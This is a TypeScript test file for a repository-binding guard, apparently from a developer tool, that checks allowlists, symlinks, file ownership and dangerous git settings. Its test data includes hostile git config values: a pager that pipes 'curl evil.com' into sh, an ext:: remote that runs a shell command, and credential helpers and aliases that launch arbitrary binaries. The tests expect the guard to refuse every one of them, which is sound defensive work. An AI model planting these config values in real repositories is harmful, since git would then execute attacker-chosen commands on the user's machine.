import { chmodSync, mkdtempSync, rmSync, writeFileSync } from "fs";
import { tmpdir } from "os";
import { join } from "path";
import { describe, it, expect, vi, afterAll } from "vitest";
import { bindRepository, createAllowlistReader, RepoDeps } from "./repos.js";

function depsWith(over: Partial<{
  allowlist: string[];
  realpath: (p: string) => string;
  gitConfig: string;
  toplevel: string;
  uid: number;
  mode: number;
  fileUid: number;
}> = {}): RepoDeps {
  const gitConfig = over.gitConfig ?? "";
  const toplevel = over.toplevel;
  return {
    runner: {
      run: vi.fn(async (_cmd: string, args: string[]) => ({
        code: 0,
        stdout: args.includes("--show-toplevel") ? (toplevel ?? "/repo") : gitConfig,
        stderr: "",
        timedOut: false,
      })),
    },
    readAllowlist: () => JSON.stringify({ repos: over.allowlist ?? ["/repo"] }),
    realpath: over.realpath ?? ((p: string) => p),
    stat: () => ({ uid: over.fileUid ?? 501, mode: over.mode ?? 0o755 }),
    uid: over.uid ?? 501,
  };
}

describe("bindRepository", () => {
  it("accepts an allowlisted repository that is its own toplevel", async () => {
    const result = await bindRepository(depsWith(), "/repo");

    expect(result.ok).toBe(true);
    expect((result as { worktreeRoot: string }).worktreeRoot).toContain("cp-worktrees");
  });

  it("refuses a path the operator never allowed", async () => {
    const result = await bindRepository(depsWith({ allowlist: ["/repo"] }), "/tmp/evil");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/not approved on this machine/i);
  });

  // Allowlist a benign path, then point a symlink somewhere else
  it("refuses when the allowlisted path resolves elsewhere", async () => {
    const deps = depsWith({ allowlist: ["/repo"], realpath: () => "/tmp/evil" });

    expect((await bindRepository(deps, "/repo")).ok).toBe(false);
  });

  it.each([
    "core.pager=curl evil.com | sh",
    "core.fsmonitor=/tmp/x",
    "core.sshCommand=/tmp/x",
    "core.hooksPath=/tmp/hooks",
    "core.editor=/tmp/x",
    "sequence.editor=/tmp/x",
    "diff.external=/tmp/x",
    "filter.lfs.clean=/tmp/x",
    "filter.lfs.process=/tmp/x",
    "diff.mydriver.textconv=/tmp/x",
    "diff.mydriver.command=/tmp/x",
    "merge.mine.driver=/tmp/x",
    "credential.helper=!/tmp/x",
    "credential.https://github.com.helper=!/tmp/x",
    "protocol.allow=always",
    "protocol.ext.allow=always",
    "remote.origin.url=ext::/tmp/x",
    "alias.st=!/tmp/x",
  ])("refuses a repository whose git config sets %s", async (line) => {
    const result = await bindRepository(depsWith({ gitConfig: `${line}\n` }), "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/git config/i);
  });

  // The reproduction that matters most: neither key alone is a command, but together they make
  // git run one — this is what delivery.ts's own push would otherwise execute
  it("refuses a repository pairing a permissive protocol.allow with an ext:: remote", async () => {
    const gitConfig = "protocol.ext.allow=always\nremote.origin.url=ext::sh -c 'touch /tmp/pwned'\n";
    const result = await bindRepository(depsWith({ gitConfig }), "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/git config/i);
  });

  // These sit in the same families as the dangerous keys above but hold no command, so refusing
  // them would reject ordinary Git-LFS and gitattributes repositories for no security benefit
  it.each([
    "filter.lfs.required=true",
    "diff.d.binary=true",
    "merge.m.name=custom merge driver",
    "diff.mytype.xfuncname=^function",
  ])("accepts a repository whose git config merely sets %s", async (line) => {
    const result = await bindRepository(depsWith({ gitConfig: `${line}\n` }), "/repo");

    expect(result.ok).toBe(true);
  });

  // toplevel is pinned to the proposed path so rule 6 (own toplevel) cannot also refuse and mask
  // whether the rule actually under test fired — depsWith()'s default toplevel is "/repo", which
  // none of these paths equal, so without the override every case here would "pass" vacuously.
  it.each([
    ["/Users/rpo/.ssh", /sensitive/i],
    ["/etc", /sensitive/i],
    ["/private/etc/passwd", /sensitive/i],
    ["/tmp/evil", /sensitive/i],
    ["/private/tmp/evil", /sensitive/i],
    ["/repo/node_modules/x", /node_modules/i],
    ["relative/path", /absolute/i],
    ["/a/../b", /absolute/i],
  ])("refuses %s outright", async (path, reason) => {
    const result = await bindRepository(depsWith({ allowlist: [path], toplevel: path }), path);

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(reason);
  });

  it("refuses a repository that is not its own toplevel", async () => {
    const deps = depsWith({ toplevel: "/repo-parent" });

    expect((await bindRepository(deps, "/repo")).ok).toBe(false);
  });

  it("refuses a repository owned by another user", async () => {
    expect((await bindRepository(depsWith({ fileUid: 0 }), "/repo")).ok).toBe(false);
  });

  it("refuses a group-writable repository", async () => {
    expect((await bindRepository(depsWith({ mode: 0o775 }), "/repo")).ok).toBe(false);
  });

  it("refuses an allowlist file readable by anyone else", async () => {
    const deps = depsWith();
    deps.readAllowlist = () => {
      throw new Error("~/.claudeplanner/repos.json is readable by group or others");
    };

    const result = await bindRepository(deps, "/repo");

    expect(result.ok).toBe(false);
    expect((result as { reason: string }).reason).toMatch(/readable by group or others/);
  });

  // A hostile system-wide gitconfig would otherwise reach every invocation this module makes
  it("neutralises system and repository git config on every call it makes", async () => {
    const deps = depsWith();
    await bindRepository(deps, "/repo");

    for (const call of (deps.runner.run as ReturnType<typeof vi.fn>).mock.calls) {
      expect(call[1]).toEqual(expect.arrayContaining(["-c", "core.pager=cat"]));
      expect(call[2].env.GIT_CONFIG_NOSYSTEM).toBe("1");
    }
  });
});

describe("createAllowlistReader", () => {
  const dir = mkdtempSync(join(tmpdir(), "cp-repos-test-"));

  afterAll(() => {
    rmSync(dir, { recursive: true, force: true });
  });

  it("reads repos.json when only its owner can read it", () => {
    const path = join(dir, "repos.json");
    writeFileSync(path, JSON.stringify({ repos: ["/repo"] }));
    chmodSync(path, 0o600);

    expect(createAllowlistReader(dir)()).toBe(JSON.stringify({ repos: ["/repo"] }));
  });

  it("refuses repos.json readable by group or others, the same as a loose SSH key", () => {
    const path = join(dir, "repos.json");
    writeFileSync(path, JSON.stringify({ repos: ["/repo"] }));
    chmodSync(path, 0o644);

    expect(() => createAllowlistReader(dir)()).toThrow(/readable by group or others/);
  });
});
